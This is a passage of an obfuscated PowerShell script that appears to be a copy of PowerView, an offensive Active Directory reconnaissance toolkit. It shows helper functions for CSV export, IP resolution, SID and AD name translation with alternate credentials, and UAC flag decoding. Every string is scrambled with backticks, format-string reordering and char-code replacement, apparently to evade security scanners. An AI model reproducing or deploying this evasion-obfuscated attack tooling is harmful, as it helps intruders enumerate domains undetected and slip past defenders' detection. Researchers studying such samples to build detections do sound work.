        
        $MappedComputers.keYs   |  Remove-RemoteConnection
    }
}


function e`XpOr`T-POw`eRViEWCsV {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{4}{1}{3}{2}"-f 'PSSh','o','ess','c','ouldPr'}, '' )]
    [CmdletBinding(   )]
    Param(
        [Parameter( MaNDAtOrY = $True, vALuefrOmPIPELINe =  $True, vAlueFRompIPeLInEbyproPERtYNamE =   $True )]
        [System.Management.Automation.PSObject[]]
        $InputObject,

        [Parameter(MaNdAtORY =   $True, PositIOn = 1  )]
        [ValidateNotNullOrEmpty(  )]
        [String]
        $Path,

        [Parameter( pOsITIOn   =   2 )]
        [ValidateNotNullOrEmpty(   )]
        [Char]
        $Delimiter  =   ',',

        [Switch]
        $Append
     )

    BEGIN {
        $OutputPath   =  [IO.Path]::gEtFULlPATH(  $PSBoundParameters[( "{1}{0}" -f 'h','Pat' )] )
        $Exists   =   [System.IO.File]::exiSTS($OutputPath  )

        
        $Mutex   =  New-Object ( 'System.Thr'+  'e'  +  'ading'  + '.Mut' + 'ex'  ) $False,("{1}{0}{2}"-f 'Mut','CSV','ex'  )
        $Null   =  $Mutex.WaItOne(  )

        if ($PSBoundParameters[(  "{0}{1}" -f 'Appe','nd' )] ) {
            $FileMode  = [System.IO.FileMode]::AppENd
        }
        else {
            $FileMode  =   [System.IO.FileMode]::crEaTe
            $Exists =  $False
        }

        $CSVStream   =   New-Object (  'IO.Fi' +'le' +'Stream' )(  $OutputPath, $FileMode, [System.IO.FileAccess]::WRiTE, [IO.FileShare]::REAd  )
        $CSVWriter =  New-Object ('S'+  'ys' + 'tem.IO'  +'.'  + 'StreamWriter' )( $CSVStream )
        $CSVWriter.aUToFLUSH  =  $True
    }

    PROCESS {
        ForEach (  $Entry in $InputObject) {
            $ObjectCSV =  ConvertTo-Csv -InputObject $Entry -Delimiter $Delimiter -NoTypeInformation

            if (-not $Exists) {
                
                $ObjectCSV  | ForEach-Object { $CSVWriter.WrItelINE($_  ) }
                $Exists   =   $True
            }
            else {
                
                $ObjectCSV[1..(  $ObjectCSV.LEnGth-1)]   |   ForEach-Object { $CSVWriter.wRITelINE(  $_  ) }
            }
        }
    }

    END {
        $Mutex.ReleAsEmuteX( )
        $CSVWriter.DIsPOSe(   )
        $CSVStream.DiSPOSE( )
    }
}


function rE`soL`VE-iP`A`DDREss {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(  {"{3}{1}{4}{0}{2}" -f 'ld','SS','Process','P','hou'}, '' )]
    [OutputType({"{0}{5}{6}{3}{4}{7}{2}{1}" -f 'S','tomObject','Cus','atio','n','ystem.Management.Au','tom','.PS'})]
    [CmdletBinding( )]
    Param( 
        [Parameter(positioN  =  0, ValueFromPIpeline   =   $True, vaLUEFrOMpIpeLINEBypRoperTYNAmE  =   $True)]
        [Alias({"{2}{1}{0}"-f'Name','st','Ho'}, {"{1}{2}{0}" -f'ame','dnshost','n'}, {"{1}{0}"-f'e','nam'}  )]
        [ValidateNotNullOrEmpty( )]
        [String[]]
        $ComputerName   = $Env:COMPUTERNAME
    )

    PROCESS {
        ForEach ( $Computer in $ComputerName  ) {
            try {
                @((  [Net.Dns]::GethOStEntrY( $Computer)).ADdReSSLIST  )  |   ForEach-Object {
                    if ($_.AddRessfAMIlY -eq ( "{1}{3}{2}{0}"-f'Network','I','er','nt')  ) {
                        $Out   =   New-Object ('PSObj' +'e'  + 'ct'  )
                        $Out   | Add-Member (  'No'+ 'tepr'+  'oper' +  'ty'  ) ("{0}{1}{2}" -f 'Co','mputer','Name'  ) $Computer
                        $Out |   Add-Member ( 'Not'+'ep'  +'roper'  + 'ty') ("{2}{0}{1}" -f'Addr','ess','IP' ) $_.IpADDReSSTOsTRiNG
                        $Out
                    }
                }
            }
            catch {
                Write-Verbose (  '['  +  'Resolve-IP'+  'Addre' +  'ss] '+  'Co'+'ul'+'d ' + 'n'  + 'ot ' +'r'  + 'esolve ' +  "$Computer "  +  'to'+' '+ 'an' + ' ' +'IP' +' ' +'Ad'+  'dre' +  'ss.' )
            }
        }
    }
}


function COn`Ve`RTTo`-s`iD {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{2}{3}{1}{0}"-f 's','oces','PSShoul','dPr'}, '')]
    [OutputType( [String] )]
    [CmdletBinding( )]
    Param( 
        [Parameter(  MANdatOrY  =   $True, VALUefROMpiPeliNE  =   $True, valUefROMPIPelINEByPROpeRtYname =  $True  )]
        [Alias(  {"{0}{1}" -f'N','ame'}, {"{0}{2}{1}" -f'I','y','dentit'} )]
        [String[]]
        $ObjectName,

        [ValidateNotNullOrEmpty(  )]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty(    )]
        [Alias( {"{1}{3}{0}{2}"-f't','DomainC','roller','on'}  )]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(   )]
        $Credential =   [Management.Automation.PSCredential]::EMpty
    )

    BEGIN {
        $DomainSearcherArguments  =   @{}
        if (  $PSBoundParameters[( "{0}{1}"-f 'Doma','in' )]  ) { $DomainSearcherArguments[(  "{0}{1}"-f 'Doma','in'  )] =   $Domain }
        if ($PSBoundParameters[( "{1}{0}" -f'rver','Se' )] ) { $DomainSearcherArguments[("{0}{1}"-f'Ser','ver')]   =   $Server }
        if ($PSBoundParameters[( "{1}{0}{3}{2}" -f 'e','Cr','ial','dent' )]  ) { $DomainSearcherArguments[( "{0}{2}{1}" -f 'Cr','al','edenti'  )] =  $Credential }
    }

    PROCESS {
        ForEach (  $Object in $ObjectName  ) {
            $Object = $Object -Replace '/','\'

            if ($PSBoundParameters[( "{0}{3}{1}{2}"-f 'Cre','ent','ial','d'  )]) {
                $DN  =  Convert-ADName -Identity $Object -OutputType 'DN' @DomainSearcherArguments
                if ( $DN) {
                    $UserDomain =   $DN.SuBStrINg($DN.InDexoF( 'DC='  ) ) -replace 'DC=','' -replace ',','.'
                    $UserName   =  $DN.split( ',')[0].sPlIt(  '=')[1]

                    $DomainSearcherArguments[(  "{0}{1}" -f 'Ident','ity' )] =  $UserName
                    $DomainSearcherArguments[("{2}{1}{0}"-f'in','ma','Do'  )] =  $UserDomain
                    $DomainSearcherArguments[(  "{0}{3}{2}{1}"-f'P','s','tie','roper'  )]   =   ( "{3}{2}{0}{1}"-f'tsi','d','c','obje' )
                    Get-DomainObject @DomainSearcherArguments  |  Select-Object -Expand ('obje'  +  'ct'+ 'sid'  )
                }
            }
            else {
                try {
                    if (  $Object.cOnTAins( '\' )  ) {
                        $Domain = $Object.spLiT( '\')[0]
                        $Object   = $Object.spLIT( '\' )[1]
                    }
                    elseif (-not $PSBoundParameters[(  "{1}{0}" -f 'omain','D')]) {
                        $DomainSearcherArguments = @{}
                        $Domain = (Get-Domain @DomainSearcherArguments ).nAmE
                    }

                    $Obj   =   (New-Object ('Syst' + 'em' + '.Sec'+'urity.Pri'+'nci'+'pal.NTA' + 'cco' + 'u'+'n'  +'t')( $Domain, $Object  ) )
                    $Obj.tRansLATe( [System.Security.Principal.SecurityIdentifier]  ).VAluE
                }
                catch {
                    Write-Verbose (  '[Conve'+  'rtTo'+ '-SID] '  +  'Erro'  +  'r ' +  'co' + 'nve'  +'r'+ 'ting '+"$Domain\$Object "+ ': '+ "$_")
                }
            }
        }
    }
}


function Co`N`VerTFrOM-sID {


    [OutputType( [String] )]
    [CmdletBinding(  )]
    Param(
        [Parameter(  MAnDATory   =  $True, VALUeFroMPIpeline   =   $True, VaLUefROmpIPELiNEBYPropERTYnaME   = $True  )]
        [Alias('SID')]
        [ValidatePattern( {"{0}{1}" -f '^S-1-','.*'}  )]
        [String[]]
        $ObjectSid,

        [ValidateNotNullOrEmpty(  )]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty(  )]
        [Alias( {"{2}{0}{3}{1}"-f'mainContr','er','Do','oll'} )]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute( )]
        $Credential = [Management.Automation.PSCredential]::empty
     )

    BEGIN {
        $ADNameArguments = @{}
        if (  $PSBoundParameters[(  "{1}{0}" -f 'n','Domai'  )] ) { $ADNameArguments[( "{0}{2}{1}"-f'D','in','oma' )] =  $Domain }
        if ($PSBoundParameters[( "{1}{0}{2}"-f 'e','S','rver'  )]  ) { $ADNameArguments[( "{0}{1}" -f 'S','erver'  )] =  $Server }
        if (  $PSBoundParameters[(  "{3}{0}{2}{1}"-f 'de','ial','nt','Cre'  )]  ) { $ADNameArguments[("{0}{2}{3}{1}" -f'Cre','al','de','nti'  )] =   $Credential }
    }

    PROCESS {
        ForEach ($TargetSid in $ObjectSid) {
            $TargetSid   =  $TargetSid.TriM('*'  )
            try {
                
                Switch (  $TargetSid) {
                    ( "{1}{0}" -f '0','S-1-' )         { (  "{1}{2}{3}{0}"-f 'ity','Null Auth','o','r'  ) }
                    ( "{0}{1}{2}" -f'S-','1-','0-0')       { ( "{0}{1}{2}"-f'N','o','body' ) }
                    (  "{0}{1}"-f'S-1','-1')         { ( "{0}{1}{2}{3}{4}" -f 'Wo','rld A','uth','or','ity'  ) }
                    ("{1}{0}{2}"-f'-','S-1','1-0')       { ("{0}{2}{1}"-f 'E','eryone','v'  ) }
                    ("{1}{0}" -f '2','S-1-'  )         { ( "{2}{3}{0}{1}"-f 'uth','ority','Local ','A'  ) }
                    (  "{1}{0}"-f '-0','S-1-2')       { (  "{1}{0}" -f'l','Loca') }
                    ( "{1}{0}" -f '1','S-1-2-'  )       { ("{0}{2}{1}{3}" -f'Console','ogon',' L',' '  ) }
                    (  "{1}{0}"-f'-3','S-1' )         { ( "{2}{1}{3}{0}" -f 'thority','tor ','Crea','Au') }
                    ( "{0}{2}{1}"-f 'S','1-3-0','-' )       { (  "{0}{2}{1}" -f 'Cr','Owner','eator '  ) }
                    (  "{0}{1}"-f'S-1','-3-1'  )       { ( "{3}{0}{1}{2}" -f'tor G','r','oup','Crea') }
                    ( "{0}{1}"-f 'S-1-3-','2' )       { ("{4}{1}{0}{3}{2}" -f't','a','wner Server','or O','Cre'  ) }
                    ( "{1}{0}{2}" -f '3','S-1-','-3'  )       { (  "{3}{0}{1}{2}" -f't','or Gr','oup Server','Crea' ) }
                    ( "{2}{1}{0}"-f'4','-','S-1-3')       { ("{3}{2}{0}{1}"-f ' ','Rights','r','Owne') }
                    ("{0}{1}"-f 'S-1','-4'  )         { ("{2}{1}{4}{5}{3}{0}" -f 'hority','ni','Non-u','ut','qu','e A'  ) }
                    (  "{0}{1}" -f'S-1-','5' )         { ( "{3}{2}{0}{1}" -f 'thori','ty','Au','NT '  ) }
                    ("{0}{2}{1}" -f'S-','-1','1-5')       { (  "{1}{0}"-f'p','Dialu'  ) }
                    ( "{1}{0}"-f '-1-5-2','S' )       { (  "{2}{1}{0}"-f'k','or','Netw' ) }
                    ( "{1}{0}{2}"-f'-5','S-1','-3')       { (  "{0}{1}" -f 'Batc','h') }
                    ("{0}{1}" -f 'S-1-5-','4'  )       { ( "{1}{2}{0}" -f'e','I','nteractiv' ) }
                    (  "{1}{2}{0}"-f'-5-6','S','-1'  )       { ("{2}{1}{0}"-f 'vice','r','Se' ) }
                    ( "{1}{2}{0}" -f'1-5-7','S','-' )       { ( "{1}{2}{0}" -f'mous','Ano','ny') }
                    (  "{2}{1}{0}"-f'8','-','S-1-5')       { ("{0}{1}"-f'Pro','xy') }
                    ( "{0}{1}{2}"-f'S','-1-5-','9')       { ("{4}{7}{0}{1}{6}{2}{3}{8}{5}" -f'is','e','main Cont','rol','E','s',' Do','nterpr','ler' ) }
                    ( "{0}{2}{1}" -f 'S-1-','10','5-'  )      { (  "{2}{4}{3}{0}{1}"-f'al S','elf','Pr','p','inci'  ) }
                    ("{0}{2}{1}"-f'S-1-5-','1','1' )      { ("{2}{1}{0}{3}" -f ' U','ted','Authentica','sers' ) }
                    ("{0}{2}{1}"-f'S-','-5-12','1')      { (  "{0}{4}{1}{2}{3}" -f'Restricted','o','d','e',' C') }
                    ("{2}{1}{0}" -f'5-13','-1-','S'  )      { ( "{0}{2}{1}{3}"-f 'T',' Server','erminal',' Users'  ) }
                    ("{0}{2}{1}" -f'S-','14','1-5-')      { ( "{1}{2}{4}{5}{3}{0}"-f 'gon','Remot','e ','Lo','Inte','ractive ' ) }
                    ( "{1}{0}{2}"-f '1-','S-','5-15')      { (  "{2}{4}{0}{1}{5}{3}" -f 'izati','o','This Orga',' ','n','n') }
                    ("{2}{1}{0}" -f'7','1','S-1-5-' )      { ( "{1}{4}{2}{5}{3}{0}"-f' ','This','r','anization',' O','g' ) }
                    ("{1}{0}"-f'-1-5-18','S')      { (  "{3}{0}{1}{2}"-f 'a','l S','ystem','Loc'  ) }
                    (  "{0}{1}" -f 'S-1','-5-19'  )      { ("{3}{1}{2}{0}" -f 'thority',' A','u','NT') }
                    (  "{1}{2}{0}" -f'0','S-1-','5-2')      { (  "{2}{3}{1}{0}" -f'y','orit','NT Aut','h'  ) }
                    (  "{2}{1}{0}"-f'-0','-5-80','S-1')    { ( "{4}{0}{3}{1}{2}"-f ' ','ce','s ','Servi','All' ) }
                    (  "{0}{1}{2}"-f 'S-1-5-32-','5','44')  { (  ( ("{1}{0}{3}{2}" -f 'UILTINs5vAdmin','B','ators','istr' )).REpLace(  ( [CHAR]115+ [CHAR]53  +  [CHAR]118 ),'\' )  ) }
                    ("{3}{0}{1}{2}" -f'-32-5','4','5','S-1-5' )  { ( ( ("{4}{3}{2}{5}{0}{1}"-f 'fV','Users','I','ILT','BU','Nr' )) -cREPlacE 'rfV',[cHar]92 ) }
                    ( "{1}{0}{2}" -f '1-5-3','S-','2-546' )  { (  (  ("{1}{0}{3}{2}"-f 'nzGue','BUILTINU','s','st'  ) ).rePLACe( (  [cHAr]85 +[cHAr]110+ [cHAr]122  ),'\' )) }
                    ("{1}{2}{0}" -f '32-547','S-1-','5-'  )  { ( ( (  "{6}{0}{2}{1}{5}{3}{4}"-f 'IL','0}Pow','TIN{','s','ers','er U','BU' ))-F  [chAR]92) }
                    (  "{1}{2}{3}{0}"-f'8','S','-1-5-32-','54' )  { (  (("{7}{4}{5}{0}{8}{3}{2}{6}{1}" -f 'c','perators','nt','u','UILTIN','mANA',' O','B','co' ) ).RepLAcE( 'mAN',[striNG][char]92  )) }
                    (  "{0}{2}{1}" -f'S-1','-549','-5-32' )  { (  ( ("{2}{1}{5}{3}{0}{4}"-f'ator','{0}','BUILTIN','erver Oper','s','S' ))  -F  [cHar]92 ) }
                    ( "{2}{0}{1}" -f'1-5-','32-550','S-' )  { (  ( ( "{5}{3}{8}{1}{6}{0}{4}{7}{2}" -f 't O','i','s','TIN','pera','BUIL','n','tor','j05Pr'  )  ).rePlaCe(([cHAR]106+ [cHAR]48+ [cHAR]53  ),[sTrIng][cHAR]92  )) }
                    ( "{3}{1}{2}{0}" -f'551','2','-','S-1-5-3'  )  { (  (  (  "{2}{0}{4}{1}{5}{3}" -f'N','i6Backup O','BUILTI','ors','O','perat'  )  ).ReplAcE( ([CHAr]79 + [CHAr]105 +  [CHAr]54 ),'\'  )) }
                    ("{3}{0}{1}{2}" -f'-','1-5-32-','552','S')  { ((("{4}{2}{0}{3}{6}{5}{1}" -f 'IN','ors','UILT','WoD','B','licat','Rep' ))-CrePlaCe([chAr]87+[chAr]111+[chAr]68 ),[chAr]92 ) }
                    (  "{1}{0}{3}{2}"-f '5-32-','S-1-','4','55'  )  { (  ( ("{1}{6}{3}{7}{2}{4}{9}{0}{8}{5}" -f'Compatible A','B','dows ','vPre-','200','cess','UILTINmN','Win','c','0 '  )).REplAcE( 'mNv','\'  )  ) }
                    (  "{1}{0}{2}{3}"-f'-','S','1-5','-32-555' )  { ( ( (  "{1}{3}{4}{5}{7}{6}{2}{0}" -f 'ers','BUILTIN','sktop Us','P','c','yR','mote De','e'  ) ).RePLaCe('Pcy','\'  )) }
                    (  "{1}{2}{0}" -f '556','S-1','-5-32-')  { ( (  (  "{0}{9}{4}{1}{10}{12}{3}{2}{6}{5}{7}{8}{11}"-f'BUILTI','two','gurat','onfi','vNe','o','i','n Opera','tor','Nt0','r','s','k C')).RePLACE( ([CHaR]116  +  [CHaR]48+ [CHaR]118 ),'\'  )  ) }
                    (  "{0}{1}{2}"-f'S-','1-5','-32-557')  { ((  ("{6}{2}{5}{8}{1}{4}{10}{9}{0}{7}{3}" -f 't','zDInc','LT','s','o','IN','BUI',' Builder','B','t Trus','ming Fores'  ))-rEPLAcE  ([ChAR]66+  [ChAR]122 + [ChAR]68 ),[ChAR]92  ) }
                    ( "{1}{0}{2}"-f '1-5-3','S-','2-558')  { (  ((  "{4}{0}{3}{7}{2}{1}{5}{6}" -f'INK8PP','t','i','erfo','BUILT','or ','Users','rmance Mon'  ) )  -CREPlACe 'K8P',[CHaR]92  ) }
                    ("{1}{0}{3}{2}" -f'5','S-1-','32-559','-' )  { ((( "{4}{2}{0}{1}{3}" -f 'og Us','e','ILTINNsrPerformance L','rs','BU' ))-CREpLaCe  (  [ChaR]78+ [ChaR]115 + [ChaR]114  ),[ChaR]92 ) }
                    ( "{0}{2}{3}{1}"-f'S','60','-1-5-32','-5'  )  { (  ( ("{5}{3}{2}{10}{6}{0}{9}{11}{4}{12}{8}{7}{1}" -f'horiza','oup','o','}Wind','s','BUILTIN{0',' Aut','r','G','tion Acce','ws','s',' ' )  ) -F[CHaR]92) }
                    ( "{2}{1}{0}{3}"-f '-5-32-','1','S-','561' )  { ( ((  "{8}{2}{4}{0}{3}{7}{5}{1}{6}" -f 'i',' License Server','r','nal ','m','ver','s','Ser','BUILTINPe1Te')  ).rEpLace( 'Pe1','\') ) }
                    ( "{1}{2}{0}"-f '5-32-562','S-1','-'  )  { (  (( "{8}{5}{4}{7}{6}{1}{3}{0}{2}"-f' U','C','sers','OM','D','LTINuY1','uted ','istrib','BUI' )  )-repLAce(  [chAr]117  + [chAr]89 +[chAr]49 ),[chAr]92) }
                    ("{1}{3}{2}{0}"-f'69','S-','2-5','1-5-3')  { ( ((  "{5}{6}{1}{2}{0}{8}{9}{3}{4}{7}" -f'yACrypt','L','TINf','phic',' Ope','B','UI','rators','ogr','a')  )  -cReplACE([CHAR]102  + [CHAR]121  +  [CHAR]65 ),[CHAR]92 ) }
                    ( "{2}{0}{1}" -f'-5-32-','573','S-1' )  { ( ( ("{2}{5}{4}{1}{0}{3}" -f'Log Reader','Event ','BU','s','INqYN','ILT' ) ).REplACE( ( [chaR]113+[chaR]89  +  [chaR]78 ),'\') ) }
                    (  "{2}{0}{1}"-f'-','5-32-574','S-1' )  { ( (  ( "{0}{1}{3}{4}{2}{8}{6}{5}{7}" -f'BUILTINt8bCertifica','te Service ','OM A','D','C','es','c','s','c')).REpLACE( 't8b',[stRING][ChAR]92  ) ) }
                    (  "{0}{2}{1}" -f 'S-1','2-575','-5-3')  { ( (  ( "{0}{5}{2}{4}{7}{1}{6}{9}{8}{3}"-f 'BUILTIN{0}RDS','Acces','m','s','ote',' Re','s Se',' ','ver','r' ))-f [chaR]92  ) }
                    ( "{1}{2}{0}" -f'2-576','S-','1-5-3'  )  { (  ( ( "{1}{5}{0}{2}{3}{4}" -f'ZRDS Endp','BUILTINm','oi','nt Serve','rs','G' )  ).replAce( 'mGZ',[STrIng][chAR]92)  ) }
                    ( "{2}{0}{1}" -f '-1-','5-32-577','S'  )  { ((  ("{6}{5}{4}{0}{8}{2}{3}{7}{1}"-f'a','rs','e','nt ','WRDS M','ILTINAs','BU','Serve','nagem') ) -CrePLACe  'AsW',[chAR]92  ) }
                    ("{3}{2}{1}{0}" -f '-5-32-578','1','-','S')  { ( (( "{3}{5}{7}{8}{0}{1}{2}{4}{6}"-f'per-','V A','dminis','BU','tra','ILTINoT','tors','BH','y' )  ).repLaCe(([CHaR]111+  [CHaR]84+  [CHaR]66),'\')) }
                    (  "{2}{1}{0}"-f '32-579','-','S-1-5'  )  { ((  ( "{10}{3}{12}{11}{2}{8}{7}{4}{0}{9}{5}{6}{1}" -f's','rs','Access Co','I','ol Assi','ance Operat','o','tr','n','t','BU','TIN21k','L' )  )-CrePLace  ([Char]50 +[Char]49+  [Char]107  ),[Char]92  ) }
                    (  "{0}{1}{2}"-f 'S','-1-','5-32-580'  )  { ((  ("{11}{10}{12}{6}{8}{5}{7}{3}{0}{13}{1}{2}{9}{4}" -f' ','pe','rato','e','s','ol Assi','ss Co','stanc','ntr','r','LT','BUI','INKjSAcce','O'  )) -rEPlAce  'KjS',[ChAr]92 ) }
                    ( 'De' +'faul'  + 't' ) {
                        Convert-ADName -Identity $TargetSid @ADNameArguments
                    }
                }
            }
            catch {
                Write-Verbose ('[ConvertFrom-'+'S'+'ID'+'] '  +  'E'  + 'rror '  +'co'+  'nver'+  'ting '+ 'SI'  +  'D ' +  "'$TargetSid' " +': ' +  "$_")
            }
        }
    }
}


function coNV`ERT-A`dN`A`mE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(  {"{1}{4}{3}{5}{2}{7}{6}{0}"-f 'tions','P','ce','h','SUseS','ouldPro','tateChangingFunc','ssForS'}, ''  )]
    [OutputType(  [String] )]
    [CmdletBinding(  )]
    Param( 
        [Parameter(maNDatOrY  =  $True, vaLuEfROMPipeLINe   = $True, vALuefROmPIPELinEBYPROpeRtYnamE   =   $True)]
        [Alias({"{1}{0}" -f 'e','Nam'}, {"{2}{1}{0}" -f 'e','bjectNam','O'} )]
        [String[]]
        $Identity,

        [String]
        [ValidateSet( 'DN', {"{1}{0}" -f 'nical','Cano'}, 'NT4', {"{1}{0}"-f'play','Dis'}, {"{0}{2}{1}{3}" -f'Do','p','mainSim','le'}, {"{2}{3}{4}{0}{1}"-f 'm','ple','Ente','rpriseS','i'}, {"{1}{0}" -f'D','GUI'}, {"{0}{1}" -f 'Unkn','own'}, 'UPN', {"{3}{1}{0}{2}"-f 'on','an','icalEx','C'}, 'SPN' )]
        $OutputType,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty(  )]
        [Alias({"{3}{1}{0}{2}"-f'ro','t','ller','DomainCon'} )]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(   )]
        $Credential =   [Management.Automation.PSCredential]::eMptY
    )

    BEGIN {
        $NameTypes   = @{
            'DN'                  =     1  
            ("{0}{1}{2}" -f 'Canoni','c','al'  )          =    2  
            'NT4'                =     3  
            ( "{1}{0}"-f 'ay','Displ')             =   4  
            ("{0}{3}{1}{2}"-f 'Dom','Sim','ple','ain')        =   5  
            (  "{4}{3}{2}{0}{1}"-f'Si','mple','se','erpri','Ent' )  =     6  
            ( "{1}{0}" -f 'UID','G' )              =    7  
            (  "{2}{0}{1}" -f 'nkno','wn','U')            =     8  
            'UPN'               =     9  
            (  "{2}{3}{1}{0}"-f 'Ex','al','Cano','nic' )       =    10 
            'SPN'                 =   11 
            'SID'                 =     12 
        }

        
        function iNv`OkE`-m`EthOd( [__ComObject] $Object, [String] $Method, $Parameters  ) {
            $Output   =   $Null
            $Output   =  $Object.GettYpE( ).inVOKeMEmBeR(  $Method, (  "{0}{3}{2}{1}"-f 'In','od','eth','vokeM'  ), $NULL, $Object, $Parameters )
            Write-Output $Output
        }

        function get-`pR`OpErTY( [__ComObject] $Object, [String] $Property  ) {
            $Object.GeTTypE( ).inVokEmeMBER( $Property, (  "{2}{0}{3}{1}"-f'etPr','erty','G','op'), $NULL, $Object, $NULL )
        }

        function seT-pRop`E`R`TY( [__ComObject] $Object, [String] $Property, $Parameters) {
            [Void] $Object.gEttyPE(   ).INVOKemeMbER(  $Property, ("{2}{0}{1}" -f 'ropert','y','SetP'  ), $NULL, $Object, $Parameters  )
        }

        
        if ( $PSBoundParameters[( "{0}{1}"-f'Ser','ver')] ) {
            $ADSInitType  = 2
            $InitName   =   $Server
        }
        elseif (  $PSBoundParameters[(  "{0}{1}{2}"-f'D','om','ain')]) {
            $ADSInitType   =   1
            $InitName   =  $Domain
        }
        elseif ($PSBoundParameters[("{2}{0}{1}"-f 'edenti','al','Cr'  )]) {
            $Cred  =  $Credential.GeTNEtWOrkcredeNTial(  )
            $ADSInitType   = 1
            $InitName  =  $Cred.DomaIn
        }
        else {
            
            $ADSInitType =   3
            $InitName = $Null
        }
    }

    PROCESS {
        ForEach (  $TargetIdentity in $Identity ) {
            if ( -not $PSBoundParameters[( "{2}{1}{0}" -f'Type','ut','Outp' )]) {
                if (  $TargetIdentity -match ((  ("{0}{1}{4}{3}{6}{7}{2}{5}{8}"-f '^[A','-','a-z','-z]+','Za',' ]','lqml','qm[A-Z','+'  ) )  -repLACe(  [chaR]108 +[chaR]113 +[chaR]109),[chaR]92)  ) {
                    $ADSOutputType  =   $NameTypes[(  "{0}{1}{2}{3}" -f'Doma','i','nSimpl','e')]
                }
                else {
                    $ADSOutputType =   $NameTypes['NT4']
                }
            }
            else {
                $ADSOutputType  =   $NameTypes[$OutputType]
            }

            $Translate  =  New-Object -ComObject ('N'+  'ameTra' +'nsla' +  'te' )

            if ($PSBoundParameters[( "{1}{3}{0}{2}" -f'denti','C','al','re' )]) {
                try {
                    $Cred =  $Credential.GEtnETWORKCredEnTiAL(  )

                    Invoke-Method $Translate ("{0}{1}" -f 'InitE','x' ) (  
                        $ADSInitType,
                        $InitName,
                        $Cred.USErNAME,
                        $Cred.doMAIn,
                        $Cred.PaSSwOrd
                    )
                }
                catch {
                    Write-Verbose ('[Conver' +  't-'+'ADNam'+ 'e]' +' '+  'Erro'+'r ' +'initial'  +'i'  +  'zin' +  'g ' + 'tr'  +  'an' +'s'+ 'lation '+'for'  +  ' '+  "'$Identity' "+ 'using' +' '+ 'al'  + 'ternat'+  'e'  + ' '+ 'credent'  +  'i' + 'als'  +' '+  ': ' +  "$_" )
                }
            }
            else {
                try {
                    $Null  =   Invoke-Method $Translate ("{1}{0}"-f'it','In'  ) (
                        $ADSInitType,
                        $InitName
                    )
                }
                catch {
                    Write-Verbose (  '['+'Co' +  'nvert-ADName'  +  '] '  +'Err' + 'or' +  ' ' +'in' +'itializi'  + 'ng '  +'tr'  +  'a'  + 'nsla'+'tion '  +'fo'+ 'r '+  "'$Identity' " +': '+"$_")
                }
            }

            
            Set-Property $Translate ("{2}{1}{0}" -f 'l','ra','ChaseRefer') ( 0x60)

            try {
                
                $Null =  Invoke-Method $Translate 'Set' ( 8, $TargetIdentity  )
                Invoke-Method $Translate 'Get' ($ADSOutputType  )
            }
            catch [System.Management.Automation.MethodInvocationException] {
                Write-Verbose "[Convert-ADName] Error translating '$TargetIdentity' : $($_.Exception.InnerException.Message) "
            }
        }
    }
}


function c`Onve`RtFR`OM`-u`Acv`ALUe {


    [OutputType({"{8}{12}{4}{0}{11}{1}{5}{10}{2}{7}{6}{9}{3}" -f's.','ized.Ord','D','ry','Collection','e','tio','ic','Syst','na','red','Special','em.'} )]
    [CmdletBinding(    )]
    Param(  
        [Parameter( MANdAtory   =   $True, VAlUEfRoMpIpeLIne  = $True, vAlUEfroMpiPELiNEBYPrOPertYname   =  $True)]
        [Alias(  'UAC', {"{3}{1}{0}{2}" -f 'o','seracc','untcontrol','u'})]
        [Int]
        $Value,

        [Switch]
        $ShowAll
     )

    BEGIN {
        
        $UACValues =  New-Object ( 'Sy'  +'s'  +  'tem.Collect'+  'ions'+ '.Sp' +'ecialized.'+ 'O'  +'rderedD'  +  'ict'  +'i' + 'onary'  )
        $UACValues.add( (  "{1}{0}" -f'T','SCRIP'), 1 )
        $UACValues.adD((  "{0}{3}{1}{2}"-f'ACC','UNTDISAB','LE','O' ), 2)
        $UACValues.add(( "{1}{4}{3}{0}{2}" -f 'EQUIR','HOM','ED','_R','EDIR' ), 8  )
        $UACValues.AdD(  ( "{1}{0}" -f 'OCKOUT','L' ), 16)
        $UACValues.Add(  ("{0}{1}{2}{3}" -f 'PA','SS','WD_','NOTREQD' ), 32  )
        $UACValues.adD( (  "{3}{5}{4}{0}{1}{2}" -f'AN','T','_CHANGE','PA','SWD_C','S'  ), 64)
        $UACValues.aDD( ( "{3}{1}{4}{7}{0}{5}{2}{6}" -f'EXT_','C','WD_ALL','EN','R','P','OWED','YPTED_T'  ), 128  )
        $UACValues.Add(("{0}{2}{4}{1}{3}"-f 'T','COUN','EMP','T','_DUPLICATE_AC'  ), 256)
        $UACValues.add( (  "{2}{0}{3}{1}" -f'RM','COUNT','NO','AL_AC' ), 512  )
        $UACValues.aDd(("{4}{3}{1}{2}{0}{5}"-f'T_ACCO','OM','AIN_TRUS','TERD','IN','UNT' ), 2048)
        $UACValues.AdD((  "{7}{5}{6}{3}{2}{0}{4}{1}" -f'O','T','CC','_TRUST_A','UN','A','TION','WORKST'  ), 4096 )
        $UACValues.aDD( (  "{4}{1}{3}{5}{0}{2}"-f 'O','E','UNT','R_T','SERV','RUST_ACC' ), 8192  )
        $UACValues.aDD(  (  "{5}{1}{3}{2}{0}{4}"-f 'OR','ONT_EXPIRE_','SW','PAS','D','D'  ), 65536  )
        $UACValues.add(( "{2}{0}{5}{3}{4}{1}"-f'S_L','NT','MN','C','COU','OGON_A' ), 131072 )
        $UACValues.Add(("{5}{0}{1}{2}{3}{4}"-f'D_','RE','QU','I','RED','SMARTCAR' ), 262144 )
        $UACValues.ADd( ("{2}{1}{3}{0}{4}"-f'AT','L','TRUSTED_FOR_DE','EG','ION'  ), 524288)
        $UACValues.add(  (  "{0}{2}{1}" -f 'NO','ATED','T_DELEG' ), 1048576)
        $UACValues.AdD(("{3}{0}{1}{2}{4}"-f'DE','S','_KEY_','USE_','ONLY'), 2097152 )
        $UACValues.Add( ("{3}{1}{2}{0}"-f 'UTH','T_REQ_P','REA','DON' ), 4194304)
